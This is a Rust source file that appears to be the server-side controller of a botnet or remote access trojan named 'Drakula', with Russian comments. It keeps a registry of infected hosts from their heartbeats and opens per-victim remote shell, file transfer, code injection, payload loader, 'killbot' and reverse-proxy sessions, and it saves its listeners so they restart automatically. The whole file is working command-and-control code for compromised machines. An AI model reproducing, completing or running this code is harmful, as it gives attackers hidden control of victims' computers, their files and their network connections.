use std::{
    collections::HashMap,
    io::*,
    net::SocketAddr,
    sync::{
        atomic::{AtomicU8, Ordering},
        mpsc::{channel, Sender},
        Mutex,
    },
    time::Duration,
};
use std::env::current_dir;

use BByte_core::{
    module::{ftp::FtpServer, shell::ShellServer , loader::LoaderServer, inject::InjectServer, rproxy::{ServerRproxy, self}, killbot::{ServerKill, self}},
    DrakulaServer,
};
use BByte_util::{
    packet::*,
    session::{Session, SessionBase, SessionManager, SessionPacket},
    *,
};
use lazy_static::*;

#[derive(Clone)]
pub struct UIHostInfo {
    pub clientid: String,
    pub peer_addr: SocketAddr,
    pub proto: DrakulaProtocol,
    pub in_rate: u64,
    pub out_rate: u64,
    pub last_heartbeat: u64,
    pub info: HostInfo,
}

#[derive(Clone)]
pub struct UIListener {
    pub id: u8,
    pub protocol: DrakulaProtocol,
    pub addr: SocketAddr,
}

macro_rules! close_session_by_clientid_in_lock {
    ($session_mgr:ident,$clientid:ident) => {
        let mut mgr = $session_mgr.lock().unwrap();
        mgr.close_by_clientid(&$clientid);
        drop(mgr);
    };
}

lazy_static! {
    static ref G_ONLINE_HOSTS: Mutex<HashMap<String, UIHostInfo>> = Mutex::new(HashMap::new());
    static ref G_LISTENERS: Mutex<HashMap<u8, DrakulaServer>> = Mutex::new(HashMap::new());
    static ref G_LISTENER_ID: AtomicU8 = AtomicU8::new(0);
    static ref G_SHELL_SESSION: Mutex<SessionManager<ShellServer>> =
        Mutex::new(SessionManager::new());
    static ref G_FTP_SESSION: Mutex<SessionManager<FtpServer>> = Mutex::new(SessionManager::new());
    static ref G_INJ_SESSION: Mutex<SessionManager<InjectServer>> = Mutex::new(SessionManager::new());
    static ref G_LOAD_SESSION: Mutex<SessionManager<LoaderServer>> = Mutex::new(SessionManager::new());
    static ref G_KILL_SESSION: Mutex<SessionManager<ServerKill>> = Mutex::new(SessionManager::new());
    static ref G_RPROX_SESSION: Mutex<SessionManager<ServerRproxy>> = Mutex::new(SessionManager::new());

    static ref G_SESSION_SENDER: Mutex<Sender<SessionBase>> = Mutex::new({
        let (sender, receiver) = channel::<SessionBase>();

        std::thread::spawn(move || loop {
            std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            let mut session = G_SHELL_SESSION.lock().unwrap();
            session.gc();

            log::info!("shell session : {}", session.count());

            let mut session = G_FTP_SESSION.lock().unwrap();
            session.gc();

            log::info!("ftp session : {}", session.count());

            let mut session = G_INJ_SESSION.lock().unwrap();
            session.gc();

            log::info!("inj session : {}", session.count());

            let mut session = G_LOAD_SESSION.lock().unwrap();
            session.gc();

            log::info!("load session : {}", session.count());

            let mut session = G_KILL_SESSION.lock().unwrap();
            session.gc();

            log::info!("kill session : {}", session.count());

            let mut session = G_RPROX_SESSION.lock().unwrap();
            session.gc();

            log::info!("REVERSE PROX session : {}", session.count());
        });

        std::thread::spawn(move || loop {
            match receiver.recv() {
                Ok(packet) => {
                    let buf = Message::build(
                        DrakulaServerCommandID::SessionPacket.to_u8(),
                        &packet.clientid,
                        packet.packet,
                    )
                    .unwrap();  
        
                    print!("{}::::::{}", packet.clientid, String::from_utf8_lossy(&buf));
        
                   
                    if let Err(e) = send_data_by_clientid(&packet.clientid, &buf) {
                        log::error!("Ошибка отправки данных клиенту {}: {}", packet.clientid, e);
                         
                    }
                }
                Err(e) => {
                    log::error!("Ошибка в цикле сессии: {}", e);
                    break;
                }
            }
        });

        sender
    });
}

pub fn cb_msg(msg: Message) {
    let mut hosts = G_ONLINE_HOSTS.lock().unwrap();

    match DrakulaClientMsgID::from(msg.id()) {
        DrakulaClientMsgID::HostInfo => {
            log::info!("hostinfo : {}", msg.clientid());

            if let std::collections::hash_map::Entry::Vacant(e) = hosts.entry(msg.clientid()) {
                e.insert(UIHostInfo {
                    clientid: msg.clientid(),
                    peer_addr: msg.peer_addr(),
                    proto: msg.proto(),
                    in_rate: 0,
                    out_rate: msg.length() as u64,
                    last_heartbeat: cur_timestamp_secs(),
                    info: msg.parser_hostinfo().unwrap(),
                });
            } else {
                let v = hosts.get_mut(&msg.clientid()).unwrap();
                *v = UIHostInfo {
                    clientid: msg.clientid(),
                    peer_addr: msg.peer_addr(),
                    proto: msg.proto(),
                    in_rate: 0,
                    out_rate: msg.length() as u64,
                    last_heartbeat: cur_timestamp_secs(),
                    info: msg.parser_hostinfo().unwrap(),
                };
            }
        }
        DrakulaClientMsgID::Heartbeat => {
            log::info!("heartbeat : {}", msg.clientid());
            if hosts.contains_key(&msg.clientid()) {
                let v = hosts.get_mut(&msg.clientid()).unwrap();
                v.last_heartbeat = cur_timestamp_secs();
                let heartbeat = msg.parser_heartbeat().unwrap();
                v.in_rate = heartbeat.in_rate;
                v.out_rate = heartbeat.out_rate;
            }
        }
        DrakulaClientMsgID::Unknow => {
            log::warn!("unknow packet id");
        }
        DrakulaClientMsgID::SessionPacket => {
            log::info!("recv SessionPacket");
            send_data_to_session(msg);
        }
    }
}

pub fn send_data_to_session(msg: Message) {
    let packet = msg.parser_sessionpacket().unwrap();

    // shell session
    let mut shell_session = G_SHELL_SESSION.lock().unwrap();
    if shell_session.contains(&packet.id) {
        shell_session.write(&packet.id, &packet.data).unwrap();
    }
    drop(shell_session);

    // ftp session
    let mut ftp_session = G_FTP_SESSION.lock().unwrap();
    if ftp_session.contains(&packet.id) {
        ftp_session.write(&packet.id, &packet.data).unwrap();
    }
    drop(ftp_session);

    // inj session
    let mut inj_session = G_INJ_SESSION.lock().unwrap();
    if inj_session.contains(&packet.id) {
        inj_session.write(&packet.id, &packet.data).unwrap();
    }
    drop(inj_session);

    // load session
    let mut load_session = G_LOAD_SESSION.lock().unwrap();
    if load_session.contains(&packet.id) {
        load_session.write(&packet.id, &packet.data).unwrap();
    }
    drop(load_session);

    // load killBot
    let mut load_session = G_KILL_SESSION.lock().unwrap();
    if load_session.contains(&packet.id) {
        load_session.write(&packet.id, &packet.data).unwrap();
    }
    drop(load_session);

    //  load reverse_proxy
     let mut rprox_session = G_RPROX_SESSION.lock().unwrap();
     if rprox_session.contains(&packet.id) {
        rprox_session.write(&packet.id, &packet.data).unwrap();
     }
     drop(rprox_session);
}

pub fn send_data_by_clientid(clientid: &String, buf: &[u8]) -> Result<()> {
    println!("send_data_by_clientid5");
    let host = G_ONLINE_HOSTS.lock().unwrap();
    println!("send_data_by_clientid2");
    if host.contains_key(clientid) {
        println!("send_data_by_clientid");
        let mut listeners = G_LISTENERS.lock().unwrap();
        for server in listeners.values_mut() {
            if server.proto() == host[clientid].proto
                && server.contains_addr(&host[clientid].peer_addr)
            {
                // Обрабатываем ошибку отправки данных
                if let Err(e) = server.sendto(&host[clientid].peer_addr, buf) {
                    log::error!("Ошибка отправки данных клиенту {}: {}", clientid, e);
                    return Err(e); // Возвращаем ошибку, если отправка не удалась
                }
            }
        }
    }
    Ok(())
}

pub fn all_listener() -> Vec<UIListener> {
    let mut ret: Vec<UIListener> = vec![];
    let listeners = G_LISTENERS.lock().unwrap();

    for k in listeners.keys() {
        if let Some(v) = listeners.get(k) {
            ret.push(UIListener {
                id: *k,
                addr: v.local_addr().unwrap(),
                protocol: v.proto(),
            });
        }
    }

    ret
}

pub fn add_listener(proto: &DrakulaProtocol, port: u16 , auto:bool) -> Result<u8> {
    let id = G_LISTENER_ID.load(Ordering::Relaxed);

    let server = DrakulaServer::new(proto.clone(), port, cb_msg)?;
    G_LISTENERS
        .lock()
        .unwrap()
        .insert(G_LISTENER_ID.load(Ordering::Relaxed), server);
    G_LISTENER_ID.store(id + 1, Ordering::Relaxed);

    let new_connection = ConnectionInfo {
        protocol: proto.clone().to_u8(),
        address: port.to_string(),
        remark:"".to_string()
    };

   if !auto {
 
    #[cfg(target_os = "windows")]
    let file_path = current_dir()
        .unwrap()
        .join("res\\connectionInfo.bin")
        .to_str()
        .unwrap()
        .to_string();
    let mut connections: Vec<ConnectionInfo> = if std::path::Path::new(&file_path.to_string()).exists() {
        let mut file = std::fs::File::open(&file_path.to_string())?;
        let mut data = String::new();
        file.read_to_string(&mut data)?;
        serde_json::from_str(&data)?
    } else {
        Vec::new()
    };

        connections.push(new_connection);

       // Сериализуем обновленный массив в JSON
       let json_data = serde_json::to_string_pretty(&connections)?;
   
       // Записываем обновленные данные в файл
       let mut file = std::fs::OpenOptions::new()
           .write(true)
           .create(true)
           .truncate(true)
           .open(file_path)?;
       file.write_all(json_data.as_bytes())?;
   }
    Ok(id)
}

pub fn remove_listener(id: u8,addr: String) -> Result<()> {
    let mut listener = G_LISTENERS.lock().unwrap();

    if let Some(server) = listener.get_mut(&id) {
        let protocol = server.protocol.clone();
        #[cfg(target_os = "windows")]
        let file_path = current_dir()
            .unwrap()
            .join("res\\connectionInfo.bin")
            .to_str()
            .unwrap()
            .to_string();

          let path_dri = file_path.clone();
          let file = std::fs::File::open(file_path)?;
          let reader = BufReader::new(file);

        

        // Десериализация JSON в вектор структур Listener
         let mut listeners: Vec<ConnectionInfo> = serde_json::from_reader(reader)?;

     

         // Поиск и удаление элемента по порту
         if let Some(index) = listeners.iter().position(|listener: &ConnectionInfo| listener.address == addr) {
             // Получаем удаляемый элемент
             let removed_listener = listeners.remove(index);
     
             // Показываем информацию о удаляемом элементе
            //  msgbox::info(
            //      &"Removed Listener".to_string(),
            //      &format!(
            //          "Protocol: {}, Address: {}, Remark: {}",
            //          removed_listener.protocol, removed_listener.address, removed_listener.remark
            //      ),
            //  );
         } else {
             // Если элемент не найден
            //  msgbox::info(&"Info".to_string(), &format!("Listener with port {} not found.", addr));
         }
        // Перезапись файла с обновлёнными данными
        let file = std::fs::File::create(path_dri)?;
        let writer = BufWriter::new(file);
        serde_json::to_writer(writer, &listeners)?;

    }

    if listener.contains_key(&id) {
        let v = listener.get_mut(&id).unwrap();
        
        v.close();
        listener.remove(&id);
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "listener not found",
        ));
    }

    Ok(())
}

pub fn all_host() -> Vec<UIHostInfo> {
    let mut ret: Vec<UIHostInfo> = vec![];

    let hosts = G_ONLINE_HOSTS.lock().unwrap();

    for k in hosts.keys() {
        if let Some(v) = hosts.get(k) {
            if !v.info.loader {
                ret.push(v.clone());
            }
        }
    }

    ret
}
pub fn all_host_loader() -> Vec<UIHostInfo> {
    let mut ret: Vec<UIHostInfo> = vec![];

    let hosts = G_ONLINE_HOSTS.lock().unwrap();

    for k in hosts.keys() {
        
        if let Some(v) = hosts.get(k) {
            if v.info.loader {

                ret.push(v.clone());
            }
        }
    }

    ret
}
pub fn remove_host(clientid: String) {
    let mut host = G_ONLINE_HOSTS.lock().unwrap();

    if host.contains_key(&clientid) {
        close_session_by_clientid_in_lock!(G_SHELL_SESSION, clientid);
        close_session_by_clientid_in_lock!(G_FTP_SESSION, clientid);
        close_session_by_clientid_in_lock!(G_INJ_SESSION, clientid);
        close_session_by_clientid_in_lock!(G_LOAD_SESSION, clientid);
        close_session_by_clientid_in_lock!(G_KILL_SESSION, clientid);
        close_session_by_clientid_in_lock!(G_RPROX_SESSION, clientid);
        host.remove(&clientid);
    }
}

pub fn get_hostinfo_by_clientid(clientid: &String) -> Option<UIHostInfo> {
    let hosts = G_ONLINE_HOSTS.lock().unwrap();
    if hosts.contains_key(clientid) {
        return Some(hosts[clientid].clone());
    }
    None
}

pub fn open_shell(clientid: &String) -> Result<()> {
    if let Some(info) = get_hostinfo_by_clientid(clientid) {
        let sender = G_SESSION_SENDER.lock().unwrap();
        let session = ShellServer::new(sender.clone(), clientid, &format!("{}", info.peer_addr))?;
        drop(sender);

        log::info!("create shell session : {}", session.id());

        let data = SessionPacket {
            id: session.id(),
            data: vec![],
        };

        G_SHELL_SESSION.lock().unwrap().register(session);

        let data = Message::build(DrakulaServerCommandID::Shell.to_u8(), clientid, data)?;
        send_data_by_clientid(clientid, &data)?;
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "client not found",
        ));
    }

    Ok(())
}

pub fn open_ftp(clientid: &String) -> Result<()> {
    if let Some(info) = get_hostinfo_by_clientid(clientid) {
        let sender = G_SESSION_SENDER.lock().unwrap();
        let session = FtpServer::new(sender.clone(), clientid, &format!("{}", info.peer_addr))?;
        drop(sender);

        log::info!("create ftp session : {}", session.id());

        let data = SessionPacket {
            id: session.id(),
            data: vec![],
        };

        G_FTP_SESSION.lock().unwrap().register(session);

        let data = Message::build(DrakulaServerCommandID::File.to_u8(), clientid, data)?;
        send_data_by_clientid(clientid, &data)?;
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "client not found",
        ));
    }

    Ok(())
}
pub fn open_inject(clientid: &String) -> Result<()> {
    if let Some(info) = get_hostinfo_by_clientid(clientid) {
        let sender = G_SESSION_SENDER.lock().unwrap();
        let session = InjectServer::new(sender.clone(), clientid, &format!("{}", info.peer_addr))?;
        drop(sender);

        log::info!("create ftp session : {}", session.id());
        let sesStr = session.id().to_string();
        let data = SessionPacket {
            id: session.id(),
            data: vec![],
        };

        G_INJ_SESSION.lock().unwrap().register(session);

        let data = Message::build(DrakulaServerCommandID::Inject.to_u8(), clientid, data)?;
        send_data_by_clientid(clientid, &data)?;
        log::error!("Droid ftp session : {}", sesStr);
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "client not found",
        ));
    }

    Ok(())
}
pub fn open_loader(clientid: &String) -> Result<()> {
    // Получаем информацию о клиенте в основном потоке
    let info = match get_hostinfo_by_clientid(clientid) {
        Some(info) => info,
        None => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "client not found",
            ))
        }
    };

    // Подготавливаем данные для передачи в поток
    let clientid_clone = clientid.clone();
    let peer_addr = info.peer_addr.to_string();
    
    // Создаем канал для получения результата
    let (result_tx, result_rx) = channel();

    // Запускаем в отдельном потоке
    thread::Builder::new()
        .name(format!("loader-{}", clientid))
        .spawn(move || {
            let result = (|| {
                // Получаем sender внутри потока
                let sender = G_SESSION_SENDER.lock().unwrap().clone();
                
                // Создаем сессию
                let session = LoaderServer::new(sender, &clientid_clone, &peer_addr)?;
                let session_id = session.id();
                
                log::info!("create ftp session: {}", session_id);

                // Регистрируем сессию
                G_LOAD_SESSION.lock().unwrap().register(session);

                // Подготавливаем данные для отправки
                let data = SessionPacket {
                    id: session_id,
                    data: vec![],
                };

                // Создаем и отправляем сообщение
                let msg = Message::build(DrakulaServerCommandID::Loader.to_u8(), &clientid_clone, data)?;
                send_data_by_clientid(&clientid_clone, &msg)?;

                Ok(())
            })();

            // Отправляем результат в основной поток
            let _ = result_tx.send(result);
        })?;

    // Ожидаем результат с таймаутом
    match result_rx.recv_timeout(Duration::from_secs(10)) {
        Ok(result) => result,
        Err(_) => {
            log::error!("Loader thread timeout for client {}", clientid);
            Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "loader operation timeout",
            ))
        }
    }
}

pub fn open_kill(clientid: &String) -> Result<()> {
    if let Some(info) = get_hostinfo_by_clientid(clientid) {
        let sender = G_SESSION_SENDER.lock().unwrap();
        log::info!("Cliked killBot Session : ");
        let session = ServerKill::new(sender.clone(), clientid, &format!("{}", info.peer_addr))?;
        log::info!("Cliked killBot session : {}", session.id());
        drop(sender);
        
        log::info!("create killBot session : {}", session.id());

        let data = SessionPacket {
            id: session.id(),
            data: vec![],
        };

        G_KILL_SESSION.lock().unwrap().register(session);

        let data = Message::build(DrakulaServerCommandID::KillBot.to_u8(), clientid, data)?;
        send_data_by_clientid(clientid, &data)?;
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "client not found",
        ));
    }

    Ok(())
}
use rand::Rng;
use tokio::task;
use tokio::time::{sleep};
use tokio::sync::mpsc;
use std::sync::Arc;
use tokio::runtime::Runtime;
use lazy_static::lazy_static;

lazy_static! {
    static ref RUNTIME: Runtime = Runtime::new().unwrap();
}
use rprox::async_module;
use std::thread;
pub fn start_rprox(clientid: &String, proxy_running: bool, stop_rx_clone: Arc<tokio::sync::Mutex<mpsc::Receiver<()>>>) -> Result<()> {
    if let Some(info) = get_hostinfo_by_clientid(clientid) {
        let sender = G_SESSION_SENDER.lock().unwrap();
        log::info!("Cliked start REVESE PROX Session : ");
        
        // Random port generation
        let mut rng = rand::thread_rng();
        let random_port = rng.gen_range(19999..=64790);
        let random2_connect_port = rng.gen_range(19999..=64790);
        println!("xxx th2 runed");

        let stop_rx = stop_rx_clone.clone();

        // Create a new thread and run the async task inside it
        std::thread::spawn(move || {
            // Create the tokio runtime to run async tasks
            let rt = tokio::runtime::Runtime::new().unwrap();
            
            // Spawn the async task within the tokio runtime
            rt.block_on(async {
                let args = vec![
                    "rproxy".to_string(),
                    "-t".to_string(),
                    format!("0.0.0.0:{}", random_port),
                    "-s".to_string(),
                    format!("0.0.0.0:{}", random2_connect_port),
                ];
                
                // Calling start_async_task
                async_module::start_async_task(args, stop_rx).await;
            });
        });

        // Continue with the other async parts, outside of std::thread
        // let rt2 = tokio::runtime::Runtime::new().unwrap();
        // rt2.block_on(async move {
            let session = Arc::new(ServerRproxy::new(sender.clone(), clientid, &format!("{}", random2_connect_port)));
            let session_clone = Arc::clone(&session);
            drop(sender);
        
            let port = format!(":{}", random_port);

            match session_clone.as_ref() {
                Ok(session) => {
                    log::info!("create reverse session : {}", session.id());
                    let data = SessionPacket {
                        id: session.id(),
                        data: vec![],
                    };
                    
                    G_RPROX_SESSION.lock().unwrap().register(session.clone());
                    
                    let mut data: Vec<u8> = vec![0, 1]; // Example data
                    data[0] = DrakulaServerCommandID::Rproxy.to_u8() as u8;
                    data[1] = 1 as u8;
                    
                    let port_bytes = port.as_bytes();
                    for (i, &byte) in port_bytes.iter().enumerate() {
                        if i + 2 < data.len() {
                            data[i + 2] = byte;
                        } else {
                            data.push(byte);
                        }
                    }

                    send_data_by_clientid(clientid, &data);
                },
                Err(e) => log::error!("Failed to create reverse session: {}", e),
            }
        // });
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "client not found",
        ));
    }

    Ok(())
}
use crate::{STOP_TX, rprox::utils};

pub fn stop_rprox(clientid: &String) -> Result<()> {
    if let Some(info) = get_hostinfo_by_clientid(clientid) {
        let sender = G_SESSION_SENDER.lock().unwrap();
        log::info!("Clicked stop REVESE PROX Session : ");
        drop(sender);

        // Create a new Tokio runtime
        let rt = Runtime::new().unwrap();

        // Use the runtime to spawn the async task
        if let Some(stop_tx) = STOP_TX.get() {
            let stop_tx = stop_tx.clone();
            rt.spawn(async move {
                tokio::time::sleep(Duration::from_secs(1)).await; // async sleep
                stop_tx.send(()).await.unwrap(); // Send stop signal
                println!("Stop signal sent");
            });
        }

        // Prepare data to send
        let mut data: Vec<u8> = vec![0, 1];
        data[0] = DrakulaServerCommandID::Rproxy.to_u8() as u8;
        data[1] = 0 as u8;
        send_data_by_clientid(clientid, &data)?;
    } else {
        return Err(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "client not found",
        ));
    }

    Ok(())
}

use std::string::String;
use std::io::Read;

use crate::{DrakulaApp, rprox};

 

pub fn listen_auto_conected()-> Result<u8>{

    #[cfg(target_os = "windows")]
    let file_path = current_dir()
        .unwrap()
        .join("res\\connectionInfo.bin")
        .to_str()
        .unwrap()
        .to_string();

        let mut file = std::fs::File::open(file_path)?;
        let mut data = String::new();
        file.read_to_string(&mut data)?;

    let connections: Vec<ConnectionInfo> = serde_json::from_str(&data)?;
    
    for (index, connection) in connections.iter().enumerate() {
       let _= add_listener(
            &DrakulaProtocol::from(connection.protocol),
            connection.address.parse().unwrap(),
            true
         );
    }
   return  Ok(9);
}